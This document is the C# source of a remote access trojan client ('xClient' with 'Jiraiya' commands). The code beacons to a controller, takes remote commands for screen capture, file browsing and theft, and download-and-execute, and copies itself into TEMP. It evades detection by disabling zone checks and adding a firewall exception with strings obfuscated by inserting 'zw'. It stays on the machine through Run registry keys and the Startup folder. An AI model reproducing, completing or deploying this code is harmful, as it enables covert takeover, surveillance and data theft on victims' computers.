using xClient.responds;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using Jiraiya.commands;
using xClient.Utils;
using System.Drawing.Imaging;
using System.Drawing;
using xClient.Utils.ScreenCapture;
using System.Net;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Reflection;

namespace xClient
{
   public static partial class Program
    {
       static List<String> hosts = new List<string>();
       static int port;
        static int hostIndex=0; 
        static Socket s;
        static IFormatter formatter = new BinaryFormatter();
        const int packet_header_size = 4;
        static byte[] rec_buff = new byte[1024 * 100];  //buffer used to receive payloeads
        static byte[] received;

       //****************** unverified stuff
        static String StartupKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
        public static String MutexName = "Jiraiya94";
        public static String DropFileName = "Jiraiya1994.exe";
        public static String InstallDirectory = "TEMP";
        public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Assembly.GetEntryAssembly().Location);
        public static FileStream StartupCopiedAssemblyFileStream;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
          //  System.Threading.Thread.Sleep(5000);
            //Application.Run(new Form1());

            hosts.Add("127.0.0.1");
            port = 1994;
            s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            init_reconnector();
            Install();
        }


        static void connection_loop()
        {
            while (!s.Connected)
            {
                Console.WriteLine("Trying to connect to | " + hosts[hostIndex] + "  ...");

                try
                {
                    s.Connect(hosts[hostIndex], port);
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Connection faild with host : " );
                    hostIndex = (hostIndex + 1) % hosts.Count;
                }



            }
            if (s.Connected)
            {
                //Console.Clear();
                Console.WriteLine("connected");
                s.BeginReceive(rec_buff, 0, rec_buff.Length, 0, rec_callback, null);

            }

        }

        static void init_reconnector()
        {
            new Thread(delegate()
            {
                while (true)
                {
                    send_text("kanare007");
                    System.Threading.Thread.Sleep(3000);
                }
            }).Start();
        }
    
        static void send_text(string text)
        {
            try
            {
                 s.Send(Encoding.ASCII.GetBytes(text));
            }
            catch (SocketException e)
            {
                Console.WriteLine(e.ToString());
                s.Close();
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                connection_loop();
            }
        }

        static void send_byte(byte[] arr)
        {
            try
            {
                byte[] payload = new byte[arr.Length + packet_header_size];
                Array.Copy(BitConverter.GetBytes(arr.Length), payload, packet_header_size);
                Array.Copy(arr, 0, payload, packet_header_size, arr.Length);
                s.Send(payload);
            }
            catch (SocketException e)
            {
                Console.WriteLine(e.ToString());
                s.Close();
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                connection_loop();
            }

        }


        static void rec_callback(IAsyncResult ar)
        {
            try
            {
              //  s.EndReceive(ar);
              //  byte[] buf = new byte[1024*100];
              //  int len = s.Receive(buf, buf.Length, 0);
              //  if (len < buf.Length)
              //  {
              //      Array.Resize(ref buf, len);
              //  }
                int k = s.EndReceive(ar);
                received = new byte[k];
                Array.Copy(rec_buff, received, received.Length);
                using (MemoryStream ms = new MemoryStream(received))
                {
                    try
                    {
                        object command = (object)formatter.Deserialize(ms);
                        var type = command.GetType();
                        if (type == typeof(Jiraiya.commands.GetInfo))
                        {
                            send_byte(resTObyte(new SendInfo()));
                        }
                        if (type == typeof(Jiraiya.commands.GetScreen))
                        {
                            handle_SendScreen((GetScreen)command);
                        }
                        if (type == typeof(Jiraiya.commands.DoRestart))
                        {
                            Console.WriteLine("restart");
                        }
                        if (type == typeof(Jiraiya.commands.DoClose))
                        {
                            Process.GetCurrentProcess().Kill();
                        }
                        if (type == typeof(Jiraiya.commands.GetDirectory))
                        {
                            handle_directories((GetDirectory)command);
                        }
                        if (type == typeof(Jiraiya.commands.GetFile))
                        {
                            handle_sendFile((GetFile)command);
                        }
                        if (type == typeof(Jiraiya.commands.DownExec))
                        {
                            handle_getFile((DownExec)command);
                        }
                        if (type == typeof(Jiraiya.commands.DoCopyCut))
                        {
                            handle_CopyCut((DoCopyCut)command);
                        }
                        if (type == typeof(Jiraiya.commands.DoRename))
                        {
                            handle_DoRename((DoRename)command);
                        }
                        if (type == typeof(Jiraiya.commands.DoExecute))
                        {
                            handle_DoExecute((DoExecute)command);
                        }

                    }
                    catch (Exception) {}

                }



                s.BeginReceive(rec_buff, 0, rec_buff.Length, 0, rec_callback, null);
            }

            catch (SocketException ex) {
                Console.WriteLine("rec comm :"+ex.TargetSite + " | " + ex.Message);
            }

        }


        static byte[] resTObyte(Respond r)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                try
                {
                    formatter.Serialize(ms, r);
                }
                catch (Exception e)
                {
                    return null;
                }
                // return SafeQuickLZ.Compress(ms.ToArray());
                return ms.ToArray();
            }
        }



   
        public static void Install()
        {
            Thread.Sleep(1000);

            byte[] currentAssemblyByteArray = null;

       
            {
                try
                {
                    if (File.Exists(Environment.GetEnvironmentVariable(InstallDirectory) + @"\" + DropFileName))
                    {
                        File.Delete(Environment.GetEnvironmentVariable(InstallDirectory) + @"\" + DropFileName);
                    }

                    using (FileStream fs = new FileStream(
                        Environment.GetEnvironmentVariable(InstallDirectory) + @"\" + DropFileName,
                        FileMode.CreateNew
                    ))
                    {
                        currentAssemblyByteArray = File.ReadAllBytes(CurrentAssemblyFileInfo.FullName);

                        fs.Write(currentAssemblyByteArray, 0, currentAssemblyByteArray.Length);

                        fs.Flush();
                    }

                    CurrentAssemblyFileInfo = new FileInfo(
                        Environment.GetEnvironmentVariable(InstallDirectory) + @"\" + DropFileName
                    );

                    Process.Start(CurrentAssemblyFileInfo.FullName);

                    Environment.Exit(0);
                }
                catch (Exception)
                {

                }
            }

            try
            {
                Environment.SetEnvironmentVariable(
                    "zwSzwEzwE_MzwAzwSzwK_NzwOzwZzwOzwNEzwCHzwEzwCzwKzwSzw"
                        .Replace("zw", "")
                    , "1", EnvironmentVariableTarget.User
                );
            }
            catch (Exception)
            {

            }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "nzwezwtzwszwh".Replace("zw", ""),
                    Arguments = "fizwrzwezwwalzwl azwdd azwllowedprogrzwam \""
                        .Replace("zw", "") + CurrentAssemblyFileInfo.FullName + "\" \""
                        + CurrentAssemblyFileInfo.Name + "\" EzwNzwAzwBzwLzwE".Replace("zw", ""),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                if (!p.WaitForExit(5000))
                {
                    p.Kill();
                }
            }
            catch (Exception)
            {

            }

        //    if (InstallOnStartupRegistryKey)
            {
                try
                {
                    Registry.CurrentUser.OpenSubKey(StartupKey, true).SetValue(
                        MutexName, "\"" + CurrentAssemblyFileInfo.FullName + "\" .."
                    );
                }
                catch (Exception)
                {

                }

                try
                {
                    Registry.LocalMachine.OpenSubKey(StartupKey, true).SetValue(
                        MutexName, "\"" + CurrentAssemblyFileInfo.FullName + "\" .."
                    );
                }
                catch (Exception)
                {

                }
            }

         //   if (CopyToStartupFolder)
            {
                try
                {
                    string startUpName =
                        Environment.GetFolderPath(
                            Environment.SpecialFolder.Startup
                        ) + @"\" + MutexName + ".exe";

                    if (currentAssemblyByteArray != null)
                    {
                        using (FileStream fs = new FileStream(
                            startUpName,
                            FileMode.OpenOrCreate,
                            FileAccess.Write
                        ))
                        {
                            fs.Write(currentAssemblyByteArray, 0, currentAssemblyByteArray.Length);
                        }
                    }

                    StartupCopiedAssemblyFileStream = new FileStream(
                        startUpName,
                        FileMode.Open
                    );
                }
                catch (Exception)
                {

                }
            }
        }

   }
}
